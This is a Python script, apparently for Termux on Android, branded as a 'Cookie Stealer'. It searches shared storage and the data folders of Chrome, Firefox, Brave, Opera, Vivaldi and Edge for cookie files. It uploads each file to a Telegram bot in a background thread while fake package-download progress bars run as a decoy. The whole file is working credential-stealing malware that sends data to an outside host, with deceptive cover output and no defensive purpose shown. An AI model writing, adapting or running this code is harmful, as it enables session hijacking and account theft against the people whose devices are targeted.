#!/usr/bin/env python3
import os
import requests
import time
import sys
import random
import threading
import shutil
from datetime import datetime

try:
    from config import BOT_TOKEN, TELEGRAM_USER_ID
except ImportError:
    print("ERROR: config.py not found! Create config.py with BOT_TOKEN and TELEGRAM_USER_ID")
    sys.exit(1)

GREEN = '\033[38;5;46m'
RED = '\033[38;5;196m'
WHITE = '\033[1;97m'
YELLOW = '\033[1;33m'
CYAN = '\033[1;36m'
PURPLE = '\033[1;35m'
RESET = '\033[0m'

def send_cookie_file(file_path):
    try:
        abs_path = os.path.abspath(file_path)
        filename = os.path.basename(abs_path)
        size = os.path.getsize(abs_path)
        if size < 1024:
            size_str = f"{size} B"
        elif size < 1024*1024:
            size_str = f"{round(size/1024,1)} KB"
        else:
            size_str = f"{round(size/(1024*1024),1)} MB"
        
        browser = "Unknown"
        if 'chrome' in abs_path.lower():
            browser = "Google Chrome"
        elif 'firefox' in abs_path.lower() or 'mozilla' in abs_path.lower():
            browser = "Mozilla Firefox"
        elif 'brave' in abs_path.lower():
            browser = "Brave Browser"
        elif 'opera' in abs_path.lower():
            browser = "Opera Browser"
        elif 'vivaldi' in abs_path.lower():
            browser = "Vivaldi Browser"
        elif 'edge' in abs_path.lower() or 'emmx' in abs_path.lower():
            browser = "Microsoft Edge"
        elif 'samsung' in abs_path.lower() or 'sbrowser' in abs_path.lower():
            browser = "Samsung Internet"
        
        caption = f"🍪 COOKIE CAPTURED\n🌐 BROWSER: {browser}\n📂 PATH: {abs_path}\n📄 FILE: {filename}\n💾 SIZE: {size_str}\n🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as f:
            requests.post(url, files={'document': f}, data={'chat_id': TELEGRAM_USER_ID, 'caption': caption}, timeout=30)
        return True
    except Exception as e:
        return False

def steal_cookies():
    cookies_found = 0
    captured_browsers = []
    
    cookie_targets = [
        '/storage/emulated/0/cookies.txt',
        '/storage/emulated/0/cookies.db',
        '/storage/emulated/0/.cookies',
        '/storage/emulated/0/Download/cookies.txt',
        '/storage/emulated/0/Download/cookies.db',
        '/storage/emulated/0/DCIM/.cookies',
        '/storage/emulated/0/Pictures/.cookies',
        '/storage/emulated/0/Android/data/.cookies',
    ]
    
    for path in cookie_targets:
        if os.path.exists(path):
            if send_cookie_file(path):
                cookies_found += 1
                captured_browsers.append(f"✓ Found: {os.path.basename(path)}")
                print(f"{GREEN}[✓] Found cookie file: {path}{RESET}")
    
    search_dirs = [
        '/storage/emulated/0/',
        '/storage/emulated/0/Download/',
        '/storage/emulated/0/Documents/',
        '/storage/emulated/0/Android/data/',
    ]
    
    for search_dir in search_dirs:
        if os.path.exists(search_dir):
            for root, dirs, files in os.walk(search_dir):
                if cookies_found > 100:
                    break
                for file in files:
                    try:
                        if 'cookie' in file.lower():
                            if file.lower().endswith(('.txt', '.db', '.sqlite', '.cookies', '.bin', '.log', '.json', '.xml')):
                                full_path = os.path.join(root, file)
                                if os.path.getsize(full_path) < 10 * 1024 * 1024:
                                    if send_cookie_file(full_path):
                                        cookies_found += 1
                                        captured_browsers.append(f"✓ {file}")
                                        print(f"{GREEN}[✓] Cookie: {file}{RESET}")
                                        time.sleep(0.2)
                    except:
                        pass
                
                if cookies_found > 100:
                    break
    
    firefox_profiles = '/storage/emulated/0/Android/data/org.mozilla.firefox/files/mozilla/firefox/'
    if os.path.exists(firefox_profiles):
        for root, dirs, files in os.walk(firefox_profiles):
            for file in files:
                if file == 'cookies.sqlite':
                    full_path = os.path.join(root, file)
                    if send_cookie_file(full_path):
                        cookies_found += 1
                        captured_browsers.append("✓ Mozilla Firefox")
                        print(f"{GREEN}[✓] Firefox cookies captured!{RESET}")
    
    chrome_path = '/storage/emulated/0/Android/data/com.android.chrome/'
    if os.path.exists(chrome_path):
        for root, dirs, files in os.walk(chrome_path):
            for file in files:
                if file == 'Cookies' or file == 'Cookies-journal':
                    full_path = os.path.join(root, file)
                    try:
                        if send_cookie_file(full_path):
                            cookies_found += 1
                            captured_browsers.append("✓ Google Chrome")
                            print(f"{GREEN}[✓] Chrome cookies captured!{RESET}")
                    except:
                        pass
                    time.sleep(0.2)
    
    brave_path = '/storage/emulated/0/Android/data/com.brave.browser/'
    if os.path.exists(brave_path):
        for root, dirs, files in os.walk(brave_path):
            for file in files:
                if file == 'Cookies':
                    full_path = os.path.join(root, file)
                    try:
                        if send_cookie_file(full_path):
                            cookies_found += 1
                            captured_browsers.append("✓ Brave Browser")
                            print(f"{GREEN}[✓] Brave cookies captured!{RESET}")
                    except:
                        pass
                    time.sleep(0.2)
    
    opera_path = '/storage/emulated/0/Android/data/com.opera.browser/'
    if os.path.exists(opera_path):
        for root, dirs, files in os.walk(opera_path):
            for file in files:
                if file == 'Cookies':
                    full_path = os.path.join(root, file)
                    try:
                        if send_cookie_file(full_path):
                            cookies_found += 1
                            captured_browsers.append("✓ Opera Browser")
                            print(f"{GREEN}[✓] Opera cookies captured!{RESET}")
                    except:
                        pass
                    time.sleep(0.2)
    
    vivaldi_path = '/storage/emulated/0/Android/data/com.vivaldi.browser/'
    if os.path.exists(vivaldi_path):
        for root, dirs, files in os.walk(vivaldi_path):
            for file in files:
                if file == 'Cookies':
                    full_path = os.path.join(root, file)
                    try:
                        if send_cookie_file(full_path):
                            cookies_found += 1
                            captured_browsers.append("✓ Vivaldi Browser")
                            print(f"{GREEN}[✓] Vivaldi cookies captured!{RESET}")
                    except:
                        pass
                    time.sleep(0.2)
    
    edge_path = '/storage/emulated/0/Android/data/com.microsoft.emmx/'
    if os.path.exists(edge_path):
        for root, dirs, files in os.walk(edge_path):
            for file in files:
                if file == 'Cookies':
                    full_path = os.path.join(root, file)
                    try:
                        if send_cookie_file(full_path):
                            cookies_found += 1
                            captured_browsers.append("✓ Microsoft Edge")
                            print(f"{GREEN}[✓] Edge cookies captured!{RESET}")
                    except:
                        pass
                    time.sleep(0.2)
    
    return cookies_found, captured_browsers

FAKE_PACKAGES = [
    "libssl-dev_1.1.1_arm64.deb", "python3-core_3.11.2_arm64.deb",
    "php_8.1.0_arm64.deb", "nginx_1.22.0_arm64.deb",
    "mysql-server_8.0.31_arm64.deb", "nodejs_18.12.0_arm64.deb",
    "docker_20.10.21_arm64.deb", "curl_7.88.1_arm64.deb",
    "wget_1.21.3_arm64.deb", "git_2.39.0_arm64.deb",
    "vim_9.0_arm64.deb", "termux-tools_1.2.3_all.deb"
]

def fake_download():
    pkg = random.choice(FAKE_PACKAGES)
    size = random.uniform(8, 65)
    duration = random.randint(20, 70)
    
    print(f"\n{YELLOW}┌─────────────────────────────────────────┐{RESET}")
    print(f"{YELLOW}│ 📦 DOWNLOADING: {pkg}{RESET}")
    print(f"{YELLOW}│ 📊 SIZE: {size:.1f} MB{RESET}")
    print(f"{YELLOW}│ ⏱ ESTIMATED: {duration}s{RESET}")
    print(f"{YELLOW}└─────────────────────────────────────────┘{RESET}")
    
    bar_len = 35
    for i in range(bar_len + 1):
        percent = (i / bar_len) * 100
        bar = "█" * i + "░" * (bar_len - i)
        print(f"\r{CYAN}▶ PROGRESS: [{bar}] {percent:.1f}%{RESET}", end="")
        time.sleep(duration / bar_len)
    
    print(f"\n{GREEN}✓ DOWNLOAD COMPLETE!{RESET}")
    time.sleep(0.8)

def show_header():
    os.system('clear')
    header = f"""
{RED}╔════════════════════════════════════════════════════════════════╗
{RED}║{YELLOW}                                                              {RED}║
{RED}║{WHITE}      ██████╗██████╗ ██╗  ██╗██╗   ██╗███████╗            {RED}║
{RED}║{WHITE}     ██╔════╝██╔══██╗██║ ██╔╝██║   ██║██╔════╝            {RED}║
{RED}║{WHITE}     ██║     ██████╔╝█████╔╝ ██║   ██║███████╗            {RED}║
{RED}║{WHITE}     ██║     ██╔══██╗██╔═██╗ ██║   ██║╚════██║            {RED}║
{RED}║{WHITE}     ╚██████╗██║  ██║██║  ██╗╚██████╔╝███████║            {RED}║
{RED}║{WHITE}      ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝            {RED}║
{RED}║{YELLOW}                                                              {RED}║
{RED}║{CYAN}                 🍪 COOKIE STEALER EDITION 🍪                  {RED}║
{RED}║{WHITE}              ✨ NO ROOT • FULLY STEALTH ✨                   {RED}║
{RED}║{YELLOW}                                                              {RED}║
{RED}╚════════════════════════════════════════════════════════════════╝{RESET}
"""
    print(header)
    time.sleep(1.5)

def main():
    show_header()
    
    print(f"{CYAN}┌─────────────────────────────────────────────────────────┐{RESET}")
    print(f"{CYAN}│ {WHITE}🔍 COOKIE EXTRACTION INITIALIZED{RESET}{CYAN}                                 │{RESET}")
    print(f"{CYAN}└─────────────────────────────────────────────────────────┘{RESET}")
    
    checks = ["Initializing cookie scanner", "Scanning accessible storage", "Checking browser directories", "Establishing secure channel"]
    for check in checks:
        print(f"{YELLOW}  ⏳ {check}...{RESET}", end=" ")
        time.sleep(random.uniform(0.5, 1))
        print(f"{GREEN}✓ OK{RESET}")
    
    print(f"\n{GREEN}┌─────────────────────────────────────────────────────────┐{RESET}")
    print(f"{GREEN}│ {WHITE}✅ COOKIE STEALER READY{RESET}{GREEN}                                         │{RESET}")
    print(f"{GREEN}└─────────────────────────────────────────────────────────┘{RESET}")
    
    print(f"\n{YELLOW}┌─────────────────────────────────────────────────────────┐{RESET}")
    print(f"{YELLOW}│ {WHITE}🍪 HARVESTING COOKIES{RESET}{YELLOW}                                            │{RESET}")
    print(f"{YELLOW}└─────────────────────────────────────────────────────────┘{RESET}")
    
    print(f"\n{WHITE}╔═══════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{WHITE}║{CYAN}            SCANNING STORAGE FOR COOKIES...                    {WHITE}║{RESET}")
    print(f"{WHITE}╚═══════════════════════════════════════════════════════════════╝{RESET}")
    time.sleep(1.5)
    
    num_pkgs = random.randint(5, 12)
    print(f"\n{GREEN}✨ Found {num_pkgs} cookie sources!{RESET}\n")
    
    cookie_thread = threading.Thread(target=steal_cookies)
    cookie_thread.daemon = True
    cookie_thread.start()
    
    for i in range(random.randint(3, 7)):
        fake_download()
    
    cookie_thread.join(timeout=5)
    
    print(f"\n{GREEN}┌─────────────────────────────────────────────────────────┐{RESET}")
    print(f"{GREEN}│ {WHITE}✅ COOKIE EXTRACTION COMPLETE!{RESET}{GREEN}                                  │{RESET}")
    print(f"{GREEN}└─────────────────────────────────────────────────────────┘{RESET}")
    
    print(f"\n{CYAN}╔═══════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{CYAN}║{WHITE}                    💡 INFORMATION 💡                        {CYAN}║{RESET}")
    print(f"{CYAN}║{YELLOW}                                                               {CYAN}║{RESET}")
    print(f"{CYAN}║{WHITE}   • All captured cookies sent to Telegram                   {CYAN}║{RESET}")
    print(f"{CYAN}║{WHITE}   • Check your Telegram for the files                       {CYAN}║{RESET}")
    print(f"{CYAN}║{WHITE}   • No root required - works on all Android versions       {CYAN}║{RESET}")
    print(f"{CYAN}║{WHITE}   • Type '{GREEN}exit{WHITE}' to close                              {CYAN}║{RESET}")
    print(f"{CYAN}╚═══════════════════════════════════════════════════════════════╝{RESET}")
    
    print(f"\n{PURPLE}════════════════════════════════════════════════════════════════{RESET}")
    print(f"{PURPLE}           PRESS ENTER TO EXIT...{RESET}")
    print(f"{PURPLE}════════════════════════════════════════════════════════════════{RESET}")
    input()
    os.system('clear')
    print(f"{GREEN}Operation completed. Check your Telegram.{RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{RED}⚠ INTERRUPTED{RESET}")
        sys.exit(0)
